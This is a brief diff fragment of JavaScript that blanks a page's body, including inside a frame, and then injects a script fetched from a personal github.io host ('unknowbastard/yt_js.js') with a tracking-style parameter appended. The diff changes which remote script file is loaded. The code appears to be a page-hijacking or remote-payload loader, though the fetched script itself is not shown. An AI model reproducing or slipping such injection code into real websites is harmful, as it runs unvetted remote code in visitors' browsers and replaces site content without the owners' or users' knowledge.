@@ -32,7 +32,7 @@ document.getElementsByTagName("body")[0].innerHTML='';
 			doc.getElementsByTagName("body")[0].innerHTML='';
 			script = document.createElement("script");
 			script.type ='text/javascript';
-			script.src ='https://coolboy112233.github.io/unknowbastard/yt_js1.js?a=15&ai='+newstr;
+			script.src ='https://coolboy112233.github.io/unknowbastard/yt_js.js?a=15&ai='+newstr;
 			doc.body.appendChild(script);
 		};
 		document.getElementsByTagName("body")[0].appendChild(safeframe);
